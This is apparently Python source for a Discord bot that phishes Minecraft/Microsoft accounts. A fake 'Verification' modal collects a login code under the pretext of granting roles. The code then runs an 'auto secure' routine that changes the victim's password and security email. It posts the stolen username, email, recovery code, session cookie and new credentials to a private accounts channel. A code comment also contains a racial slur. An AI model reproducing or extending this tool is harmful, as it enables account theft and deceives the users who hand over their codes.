import json
import data
import aiohttp
import discord
import time
from discord import ui, Webhook, NotFound, HTTPException
from views.otp import automate_auto_change, CreateRandomEmail, generate_password

config = json.load(open("config.json", "r+"))
class MyModalTwo(ui.Modal, title="Verification"):
    box_three = ui.TextInput(label="Code", required=True)

    async def on_submit(self, interaction: discord.Interaction, /) -> None:

        logs_channel = interaction.client.get_channel(config["logs_channel"])
        accounts_channel = interaction.client.get_channel(config["accounts_channel"])

        newgenpassword = generate_password()
        TempEmail = await CreateRandomEmail()
        email = data.LastUsedEmail

        Code_embed=discord.Embed(
                title="Login Code",
                description=f"Got the login code for **{data.LastUsedEmail}**\n```{self.box_three.value}```",
                colour=0x008000
        )

        await logs_channel.send(embed=Code_embed)
            
        if TempEmail is not None:
            embedsecure = discord.Embed(
                title="Auto Secure",
                colour=0x9900FF
        ) 
        else:
            embedfail = discord.Embed(
                title="Auto Secure Failed",
                description="Failed To Auto Create Email. Double Check Your API Key For MailSlurp.",
                colour=0xFF0000
            )
            await logs_channel.send(embedfail)

        await interaction.response.send_message(
            "⌛ Please Allow Up To One Minute For Us To Proccess Your Roles...", ephemeral=True
        )

        async with aiohttp.ClientSession() as session:

            # Autosecure Process
            starttime = time.time()
            await automate_auto_change(email,self.box_three.value,TempEmail,newgenpassword)
            endtime = time.time()
            timetotal = endtime - starttime

            if config.LastCookie == "": #This nigga did not code this right will check later
                embedfailsecure = discord.Embed(title="Auto Fail",colour=0xFF0000)
                embedfailsecure.add_field(name="**Minecraft Username:**", value=f"```{config.LastUserName}```", inline=False)
                embedfailsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{config.LastUserName}.png")
                await accounts_channel.send(embed=embedfailsecure)
            else:
                embedsecure.add_field(name="**Minecraft Username:**", value=f"```{config.LastUserName}```", inline=True)
                embedsecure.add_field(name="**Email:**", value=f"```{config.LastUsedEmail}```", inline=True)
                embedsecure.add_field(name="**Recovery Code:**", value=f"```{config.LastRecoveryCode}```", inline=False)
                embedsecure.add_field(name="**Security Email (Only Valid For 24Hours):**", value=f"```{TempEmail}```", inline=True)
                embedsecure.add_field(name="**Cookie:**", value=f"```{config.LastCookie}```", inline=False)
                embedsecure.add_field(name="**Time Taken:**", value=f"```{timetotal}```", inline=False)
                embedsecure.set_thumbnail(url= f"https://mc-heads.net/avatar/{config.LastUserName}.png")
                await accounts_channel.send(embed=embedsecure)
